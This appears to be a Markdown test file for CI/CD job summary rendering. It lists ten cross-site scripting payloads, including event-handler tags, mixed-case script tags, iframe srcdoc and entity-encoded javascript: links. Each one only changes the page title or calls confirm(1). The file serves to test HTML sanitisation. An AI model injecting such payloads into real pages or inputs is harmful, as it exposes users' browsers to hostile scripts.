# CI/CD Job Summary XSS test

Raw tag: <img src=x onerror="document.title='PWNED1'">

SVG: <svg onload="document.title='PWNED2'">

Marquee/plaintext breakout: '"><marquee><img src=x onerror=confirm(1)></marquee>

Details/ontoggle: <details open ontoggle="document.title='PWNED3'">x</details>

Case-mixed script: <ScRiPt>document.title='PWNED4'</sCrIpT>

Iframe srcdoc: <iframe srcdoc="&lt;script&gt;parent.document.title='PWNED5'&lt;/script&gt;"></iframe>

Anchor javascript: [click](javascript:document.title='PWNED6')

Entity-encoded scheme: <a href="javascript&colon;document.title='PWNED7'">click</a>

Style-based: <p style="background:url(javascript:document.title='PWNED8')">x</p>

Object data: <object data="javascript:document.title='PWNED9'"></object>
